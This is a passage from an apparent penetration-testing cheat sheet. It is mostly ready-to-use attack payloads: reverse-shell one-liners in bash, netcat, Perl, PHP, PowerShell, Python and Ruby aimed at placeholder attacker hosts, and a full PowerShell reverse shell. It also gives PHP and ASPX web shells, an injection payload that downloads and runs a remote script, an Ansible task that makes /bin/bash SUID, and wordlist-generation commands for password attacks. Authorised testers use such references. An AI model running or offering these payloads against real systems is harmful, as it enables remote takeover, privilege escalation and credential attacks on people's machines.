http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

##### Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

##### mkfifo Reverse Shell

```c
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
mkfifo /tmp/shell; nc IP PORT 0</tmp/shell | /bin/sh > /tmp/shell 2>&1; run /tmp/shell
```

##### Netcat Reverse Shell

```c
nc -e /bin/sh <LHOST> <LPORT>
```

##### Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### PHP Reverse Shell

```c
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

##### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

##### Python Reverse Shell

```c
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

```c
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

##### Ruby Reverse Shell

```c
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Web Shells

##### PHP Web Shell

```c
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

### Templates

#### ASPX Web Shell

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

Javascript command execution In the url, urlencoded

```c
${script:javascript:java.lang.Runtime.getRuntime().exec(' curl 
192.168.x.x/shell.sh -o /tmp/shell.sh;chmod 777 /tmp/shell.sh;bash 
/tmp/shell.sh')}
```

#### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

### Wordlists

#### Bash

##### Add Numbers to Password Segment

```c
for i in {1..100}; do printf "Password@%d\n" $i >> <FILE>; done
```

#### CeWL

```c
cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
```

#### CUPP

```c
./cupp -i
```

#### crunch

```c
crunch 6 6 -t foobar%%% > wordlist
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o <FILE>.txt
```

#### JavaScript Quick Wordlist

```js
javascript:(function(){const e=document.documentElement.innerText.match(/[a-zA-Z_\-]+/g),n=[...new Set(e)].sort();document.open(),document.write(n.join("<br>")),document.close();})();
```

#### Mutate Wordlists

##### Remove all Number Sequences

```c
head /PATH/TO/WORDLIST/<WORDLIST> > <FILE>.txt
sed -i '/^1/d' <FILE>.txt
```


#### Username Anarchy

```c
./username-anarchy -f first,first.last,last,flast,f.last -i <FILE>
```
